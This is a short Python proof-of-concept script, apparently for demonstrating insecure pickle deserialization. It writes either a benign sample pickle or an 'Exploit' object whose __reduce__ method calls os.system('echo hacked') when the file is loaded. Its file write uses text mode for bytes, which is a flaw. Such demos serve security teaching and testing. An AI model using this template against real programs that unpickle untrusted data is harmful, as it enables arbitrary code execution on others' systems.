import pickle
import os


def generate_example():
    return pickle.dumps({'username': 'dan', 'password': '1234', 'command': 'echo cool'})


class Exploit(object):
    def __reduce__(self):
        return (os.system, ('echo hacked',))


def generate_exploit():
    return pickle.dumps(Exploit())


def main(argv):
    if not 2 <= len(argv) <= 3:
        print('USAGE: %s [--example] <script-path>' % argv[0])
        return 1
    if len(argv) == 2:
        example, path = False, argv[1]
    else:
        example, path = True, argv[2]
    if example:
        script = generate_example()
    else:
        script = generate_exploit()
    with open(path, 'w') as writer:
        writer.write(script)
    print('done')


if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
